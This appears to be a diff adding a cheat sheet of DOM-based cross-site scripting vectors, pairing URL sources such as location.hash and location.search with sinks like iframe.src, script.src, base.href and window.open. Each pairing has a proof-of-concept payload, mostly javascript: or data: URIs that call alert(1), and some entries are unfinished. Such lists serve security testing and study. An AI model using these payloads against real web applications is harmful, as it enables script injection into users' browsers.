@@ -1,0 +1,33 @@
+Sinks supporting JavaScript URI
+
+location.hash - a.href - #javascript:alert(1) 
+location.hash - document.location - #javascript:alert(1)
+location.hash - form.action -  #javascript:alert(1)
+location.hash - iframe.src - #data:text/html,<script>alert(1)</script>
+location.hash - input.formaction - #javascript:alert(1)
+location.hash - window.open - #javascript:alert(1)
+
+location.search - area.href - javascript:alert(1)
+location.search - a.xlink-href - javascript:alert(1)
+location.search - button.formaction - javascript:alert(1)
+location.search - document.location.assign - javascript:alert(1)
+location.search - frame.src - data:text/html,<script>alert(1)</script>
+
+Sinks supporting resource URIs
+
+location.hash - base.href - #http://127.0.0.1:9090/ and create exploit.js and write alert(1) in it. 
+location.hash - embed.src - #data:text/html,<script>alert(1)</script>
+location.hash - fetch resource - #data:text/html,<img%20src%20onerror=alert(1)>
+location.hash - link.href - ???
+location.hash - object.data - #data:text/html,<script>alert(1)</script>
+location.hash - param[code].value - flash is not supported 
+location.hash - param[movie].value - flash is not supported 
+location.hash - param[src].value - flash is not supported 
+location.hash - param[url].value - flash is not supported 
+location.hash - script.href (xlink:href) - data:text/javascript,alert(1)
+location.hash - script.src - data:text/javascript,alert(1)
+location.hash - xhr.open - #data:text/html,<img%20src%20onerror=alert(1)>
+
+location.hash - partial domain of URI to script.src - ???
+location.hash - partial path of URI to script.src - ???
+location.hash - partial query string of URI to script.src - ???
